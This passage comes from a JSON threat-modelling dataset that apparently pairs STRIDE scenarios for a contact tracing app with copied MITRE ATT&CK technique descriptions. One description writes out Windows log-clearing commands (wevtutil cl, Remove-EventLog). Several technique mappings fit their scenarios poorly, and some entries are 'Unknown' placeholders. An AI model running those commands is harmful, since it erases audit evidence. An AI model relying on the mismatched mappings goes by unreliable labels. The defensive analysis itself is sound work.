                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious user creates a spoofed version of the contact tracing application to collect user data.",
            "Assumptions": [
                {
                    "Assumption": "Users download apps from unofficial sources.",
                    "Role": "User",
                    "Condition": "Users are not vigilant about app sources."
                },
                {
                    "Assumption": "Malicious actors can publish apps on unofficial app stores.",
                    "Role": "Malicious Actor",
                    "Condition": "Unofficial app stores lack proper vetting."
                },
                {
                    "Assumption": "The spoofed app appears legitimate.",
                    "Role": "Developer",
                    "Condition": "Malicious actors can create convincing interfaces."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user data, compromise of personal privacy.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "mobile app",
                "user data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts Bluetooth signals and impersonates a user device to inject false proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not encrypted.",
                    "Role": "Developer",
                    "Condition": "Developers fail to implement encryption for Bluetooth communications."
                },
                {
                    "Assumption": "Attackers have access to specialized hardware for signal interception.",
                    "Role": "Malicious Actor",
                    "Condition": "Attackers possess necessary equipment and knowledge."
                },
                {
                    "Assumption": "The application does not verify the authenticity of incoming Bluetooth signals.",
                    "Role": "Developer",
                    "Condition": "Existing protocol lacks verification mechanisms."
                }
            ],
            "Potential Impact": "Corruption of contact tracing data, false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "bluetooth",
                "signal interception",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a stolen device ID to authenticate and upload false positive COVID-19 cases.",
            "Assumptions": [
                {
                    "Assumption": "Centralized servers do not verify the authenticity of the source.",
                    "Role": "Developer",
                    "Condition": "Authentication mechanisms are weak or nonexistent."
                },
                {
                    "Assumption": "Attacker has access to stolen device IDs.",
                    "Role": "Malicious Actor",
                    "Condition": "Malicious actors gain access through theft or data breaches."
                },
                {
                    "Assumption": "The application does not have multi-factor authentication implemented.",
                    "Role": "Developer",
                    "Condition": "Deployment lacks robust authentication protocols."
                }
            ],
            "Potential Impact": "False alarms, widespread panic, and mistrust in the system.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device ID",
                "false authentication",
                "multi-factor"
            ],
            "mitre_technique": {
                "name": "Forge Web Credentials",
                "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  ",
                "id": "attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c",
                "technique_id": "T1606"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A hacker modifies the application on a compromised device to send false location data to the central server.",
            "Assumptions": [
                {
                    "Assumption": "The device has already been compromised by malware.",
                    "Role": "User",
                    "Condition": "User's device security is breached."
                },
                {
                    "Assumption": "Location data is not properly validated by the server.",
                    "Role": "Developer",
                    "Condition": "Server does not perform validation checks on incoming data."
                },
                {
                    "Assumption": "There is no data integrity verification mechanism in the application.",
                    "Role": "Developer",
                    "Condition": "Application does not use checksums or similar integrity mechanisms."
                }
            ],
            "Potential Impact": "Loss of data integrity, publication of misleading data, and invalidation of contact tracing efforts.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "location data",
                "data validation",
                "malware"
            ],
            "mitre_technique": {
                "name": "Path Interception by PATH Environment Variable",
                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
                "technique_id": "T1574.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with internal access alters log files to erase traces of unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has insider access to the system.",
                    "Role": "Malicious Actor (Insider)",
                    "Condition": "Attackers gain roles permitting access to log files."
                },
                {
                    "Assumption": "Log files are not protected with strong access controls.",
                    "Role": "Developer",
                    "Condition": "Access controls for log files are weak or misconfigured."
                },
                {
                    "Assumption": "There are no audit trails or monitoring in place for log files.",
                    "Role": "System Administrator",
                    "Condition": "Monitoring systems are absent or inefficient."
                }
            ],
            "Potential Impact": "Loss of auditability, ability to detect breaches, and possible covering up of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log files",
                "insider threat",
                "access control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A compromised central server is used to send manipulated exposure alerts.",
            "Assumptions": [
                {
                    "Assumption": "Central server can be compromised through known vulnerabilities.",
                    "Role": "System Admin",
                    "Condition": "Servers have unpatched vulnerabilities."
                },
                {
                    "Assumption": "The exposure alert system does not have verification steps.",
                    "Role": "Developer",
                    "Condition": "Alert mechanisms are direct and lack verification."
                },
                {
                    "Assumption": "Attackers have the expertise to exploit server vulnerabilities.",
                    "Role": "Malicious Actor",
                    "Condition": "Attackers are both knowledgeable and motivated."
                }
            ],
            "Potential Impact": "Widespread panic, loss of trust in the system, and invalid data leading to misinformed decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "central server",
                "exposure alerts",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny uploading their rolling keys after testing positive for COVID-19.",
            "Assumptions": [
                {
                    "Assumption": "No mechanisms exist to authenticate user actions related to uploading data.",
                    "Role": "Developer",
                    "Condition": "System lacks non-repudiation controls."
                },
                {
                    "Assumption": "Application processes do not log user actions in a verifiable manner.",
                    "Role": "Developer",
                    "Condition": "Logging infrastructure is not robust."
                },
                {
                    "Assumption": "Users can freely interact with the system without identity verification.",
                    "Role": "User",
                    "Condition": "Identity is not confirmed during critical actions."
                }
            ],
            "Potential Impact": "Inability to enforce accountability, potential manipulation of the system, and undermined data integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "rolling keys",
                "data upload",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker sends logs with altered timestamps to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in a vulnerable format that allows easy alterations.",
                    "Role": "Developer",
                    "Condition": "Logs lack integrity verification."
                },
                {
                    "Assumption": "Attacker has write access to log files.",
                    "Role": "Malicious Actor (Insider)",
                    "Condition": "Necessary permissions are compromised."
                },
                {
                    "Assumption": "No mechanisms are in place to compare logs with known good states.",
                    "Role": "System Administrator",
                    "Condition": "Monitoring and comparison systems are absent."
                }
            ],
            "Potential Impact": "Loss of accurate logging, difficulty in incident response, and covering up of malicious actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log files",
                "timestamps",
                "critical operations"
            ],
            "mitre_technique": {
                "name": "Timestomp",
                "description": "Adversaries may take actions to hide the deployment of new, or modification of existing files to obfuscate their activities. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)",
                "id": "attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a",
                "technique_id": "T1099"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies receiving exposure notifications despite evidence of alerts sent by the system.",
            "Assumptions": [
                {
                    "Assumption": "Exposure notifications are not linked to user accounts in a traceable manner.",
                    "Role": "Developer",
                    "Condition": "System centralizes notifications without linking specific users."
                },
                {
                    "Assumption": "There are no logs maintained that record notification sent status.",
                    "Role": "Developer",
                    "Condition": "Notification actions are not logged properly."
                },
                {
                    "Assumption": "User devices do not keep a record of received notifications.",
                    "Role": "User Device",
                    "Condition": "Lack of local logging or record-keeping mechanisms."
                }
            ],
            "Potential Impact": "Inability to prove that notifications were sent and received, leading to disputes and trust issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notifications",
                "traceability",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is intercepted during transmission between devices and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted or use weak encryption.",
                    "Role": "Developer",
                    "Condition": "Encryption protocols are weak or improperly implemented."
                },
                {
                    "Assumption": "Attacker has the capability to perform a man-in-the-middle (MitM) attack.",
                    "Role": "Malicious Actor",
                    "Condition": "Network has vulnerabilities that enable MitM attacks."
                },
                {
                    "Assumption": "Users are connected to unsecured networks.",
                    "Role": "User",
                    "Condition": "Users access the app over public or untrusted networks."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, leading to privacy breaches and potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data transmission",
                "encryption",
                "mitm"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A breach of the central server leads to the leakage of user location and health status data.",
            "Assumptions": [
                {
                    "Assumption": "Central server is vulnerable to known exploits or vulnerabilities.",
                    "Role": "System Admin",
                    "Condition": "Server security patches are not up-to-date."
                },
                {
                    "Assumption": "Sensitive data is not adequately protected (e.g., lack of encryption).",
                    "Role": "Developer",
                    "Condition": "Sensitive data is stored in plaintext or weakly encrypted."
                },
                {
                    "Assumption": "Attackers have sufficient knowledge to exploit server vulnerabilities.",
                    "Role": "Malicious Actor",
                    "Condition": "Attackers are skilled in performing exploitation."
                }
            ],
            "Potential Impact": "Massive breach of user privacy, potential for identity theft, and loss of trust in the system.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data breach",
                "server vulnerabilities",
                "privacy"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider with access to backend systems leaks user data to unauthorized third parties.",
            "Assumptions": [
                {
                    "Assumption": "Internal access controls are weak or poorly enforced.",
                    "Role": "System Admin",
                    "Condition": "Permission systems are not robust."
                },
                {
                    "Assumption": "Insiders have high privileges with minimal monitoring.",
                    "Role": "Malicious Actor (Insider)",
                    "Condition": "High-permission accounts are not monitored."
                },
                {
                    "Assumption": "No data leak prevention mechanisms are in place.",
                    "Role": "Developer",
                    "Condition": "Systems lack DLP tools."
                }
            ],
            "Potential Impact": "Unauthorized access to and exposure of sensitive data, degradation of user trust, and potential legal consequences.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "data leak",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a Distributed Denial of Service (DDoS) attack on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Central server is not equipped with DDoS mitigation.",
                    "Role": "System Admin",
                    "Condition": "No DDoS protection measures are in place."
                },
                {
                    "Assumption": "Network infrastructure is vulnerable to high traffic volumes.",
                    "Role": "System Admin",
                    "Condition": "Infrastructure lacks capacity planning."
                },
                {
                    "Assumption": "Attackers have resources to launch high-volume DDoS attacks.",
                    "Role": "Malicious Actor",
                    "Condition": "Attackers control large botnets or similar resources."
                }
            ],
            "Potential Impact": "Disruption of service availability, users unable to receive notifications or upload data, and panic among users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network traffic",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive number of false location updates flood the system, causing processing delays.",
            "Assumptions": [
                {
                    "Assumption": "There is no rate limiting or input validation for location updates.",
                    "Role": "Developer",
                    "Condition": "System does not validate or limit input rates."
                },
                {
                    "Assumption": "Malicious actors can automate the submission of location updates.",
                    "Role": "Malicious Actor",
                    "Condition": "Automated tools are available for attackers."
                },
                {
                    "Assumption": "System lacks monitoring tools to detect abnormal activity.",
                    "Role": "System Admin",
                    "Condition": "No monitoring or anomaly detection is in place."
                }
            ],
            "Potential Impact": "System slowdowns, delayed data processing and notifications, and potential service outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "location updates",
                "input validation",
                "automation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider deliberately uses privileged access to exhaust system resources.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have high-level access with minimal restrictions.",
                    "Role": "System Admin",
                    "Condition": "Access controls are not stringent."
                },
                {
                    "Assumption": "There are inadequate monitoring and alerting mechanisms for resource usage.",
                    "Role": "System Admin",
                    "Condition": "Resource usage is not properly monitored."
                },
                {
                    "Assumption": "Privileged actions are not logged or audited effectively.",
                    "Role": "System Admin",
                    "Condition": "Logging and auditing systems are weak or non-existent."
                }
            ],
            "Potential Impact": "System resource exhaustion, denial of service to legitimate users, and difficulty in identifying malicious actions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "insider threat",
                "privileged access"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a vulnerability in the app to gain admin-level permissions.",
            "Assumptions": [
                {
                    "Assumption": "The application has unpatched security vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Known vulnerabilities remain unaddressed."
                },
                {
                    "Assumption": "Attackers have the skills to identify and exploit vulnerabilities.",
                    "Role": "Malicious Actor",
                    "Condition": "Attackers can perform necessary technical actions."
                },
                {
                    "Assumption": "There are no internal checks to detect privilege escalation.",
                    "Role": "System Admin",
                    "Condition": "Monitoring for anomalies is insufficient."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functions, potential data breaches, and compromise of app integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "admin permissions",
                "app security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates the installation process to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Installation process does not include robust validation.",
                    "Role": "Developer",
                    "Condition": "Installation routines lack security checks."
                },
                {
                    "Assumption": "Users install from sources vulnerable to tampering.",
                    "Role": "User",
                    "Condition": "Users use unreliable installation sources."
                },
                {
                    "Assumption": "Attacker has means to tamper with the installation files.",
                    "Role": "Malicious Actor",
                    "Condition": "Malicious actors can modify installation files."
                }
            ],
            "Potential Impact": "Compromised application integrity, unauthorized actions performed with elevated privileges, and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "installation process",
                "validation",
                "tampering"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
